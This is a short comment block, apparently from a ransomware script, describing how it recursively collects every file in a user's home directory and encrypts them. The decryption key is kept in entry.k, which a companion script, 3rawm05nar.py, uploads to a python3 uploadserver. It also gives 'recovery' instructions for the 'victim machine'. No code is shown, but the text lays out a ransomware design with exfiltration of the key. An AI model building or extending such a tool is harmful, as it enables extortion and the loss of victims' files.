# It recusively gathers all of the files in the user's home dir and stores in f.

# Note: entry.k retrieval is crucial and it's the key used in this script to decrypt files.
# If entry.k is lost, files may not be recoverable. Use at own risk :)
# Recovery - Copy and paste the contents from entry.k to the victim machine labelled entry.k.
# The entry.k file can be recovered from the python3 uploadserver that it was uploaded to in 3rawm05nar.py.
